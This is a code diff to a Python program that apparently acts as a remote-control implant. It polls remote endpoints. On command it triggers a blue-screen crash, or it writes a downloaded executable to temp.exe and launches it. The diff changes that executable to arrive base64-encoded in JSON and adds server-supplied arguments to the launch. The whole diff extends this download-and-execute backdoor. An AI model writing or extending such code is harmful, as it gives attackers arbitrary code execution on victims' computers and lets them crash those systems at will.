@@ -1,6 +1,7 @@
 from subprocess import CREATE_NEW_CONSOLE, Popen
 from PIL import UnidentifiedImageError, Image
 from requests import Response, get
+from base64 import b64decode
 from time import sleep
 from os import remove
 
@@ -23,14 +24,17 @@ def main() -> None:
         if get_bsod_response.status_code == 200:
             invoke_bsod()
         if get_run_file_response.status_code == 200:
-            run_file(get_run_file_response.content)
+            run_file(get_run_file_response.json())
         sleep(DELAY)
 
 
-def run_file(content: bytes) -> None:
+def run_file(response_json: dict) -> None:
     with open("temp.exe", "wb") as temp_file:
-        temp_file.write(content)
-    Popen("temp.exe", creationflags=CREATE_NEW_CONSOLE)
+        temp_file.write(b64decode(response_json.get("runfile")))
+    Popen(
+        f"temp.exe {response_json.get('args')}",
+        creationflags=CREATE_NEW_CONSOLE,
+    )
 
 
 def invoke_bsod() -> None:
